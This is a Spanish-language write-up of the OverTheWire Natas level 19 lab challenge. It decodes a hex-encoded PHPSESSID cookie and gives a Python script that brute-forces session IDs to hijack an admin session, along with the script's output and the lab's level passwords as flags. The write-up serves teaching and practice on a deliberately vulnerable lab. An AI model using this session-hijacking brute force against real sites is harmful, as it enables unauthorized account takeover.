#Natas Level 18 → Level 19

Username: natas19

URL:      http://natas19.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas19.natas.labs.overthewire.org** 
- **Usuario    : natas19**
- **Contraseña : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs**

La contraseña la hemos sacado del nivel anterior.

Entramos a la web y nos muestra dos campos donde tenemos que introducir el **usuario** y la **contraseña** para poder conseguir las credenciales para el nivel **natas20** pero en esta ocasión nos indican que las **PHPSESSID** no son secuenciales

```html
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
Please login with your admin account to retrieve credentials for natas20.
Username: 
Password:
```

Vemos que en el código fuente no encontramos nada así que vamos a ver el valor de la **COOKIE** **PHPSESSID**

```php
PHPSESSID = 3231372d61646d696e
```

Parece que ya no es un valor numérico sino otro formato. 

Probamos a decodificarlo en diferentes formatos y nos damos cuenta de que el texto está en **HEX** por lo que le pasamos un **DECODER** y miramos que nos sale

```php
PHPSESSID = 3231372d61646d696e     ->  Hex2ASCII   -> PHPSESSID = 217-admin
```

Viendo el reto anterior, podemos deducir que también tiene 640 sesiones posible para usuarios y admin. 

En este caso, seguramente podamos crear un patrón del siguiente tipo y luego codificarlo en hex

```php
201-admin
202-admin
203-admin
204-admin
```

Así que vamos a crear otro script en python para que nos automatice la tarea de nuevo. 

Vamos a utilizar el código del nivel anterior pero modificandole la linea del **SESSID** donde la codificaremos a **HEX** como nos indican.

En un alarde de originalidad, vamos a ponerle el nombre de nata19.py :smile:

```python
import requests
 
for sessid in range(641):
	payload = ""+(str(sessid)+'-admin').encode('hex')
	r = requests.get('http://natas19.natas.labs.overthewire.org?debug=1', 
		auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), 
		cookies={'PHPSESSID':str(payload)})
 
	if 'You are an admin' in r.content:
	    print r.content 
	    break
	else:
		print "PHPSESSID ->\t {0} - {1}\t NOPE :( ".format(str(sessid),payload)
```

Lo ejecutamos y esperamos a ver el resultado.

```bash
ikerburguera@:~/Desktop$ python natas19.py
PHPSESSID ->	 0 - 302d61646d696e	 NOPE :( 
PHPSESSID ->	 1 - 312d61646d696e	 NOPE :( 
PHPSESSID ->	 2 - 322d61646d696e	 NOPE :( 
PHPSESSID ->	 3 - 332d61646d696e	 NOPE :( 
...
PHPSESSID ->	 591 - 3539312d61646d696e	 NOPE :( 
PHPSESSID ->	 592 - 3539322d61646d696e	 NOPE :( 
PHPSESSID ->	 593 - 3539332d61646d696e	 NOPE :( 
PHPSESSID ->	 594 - 3539342d61646d696e	 NOPE :( 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
</body>
</html>
```

Y nos devuelve la password del siguiente nivel! :smile:

**FLAG** = {eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF}


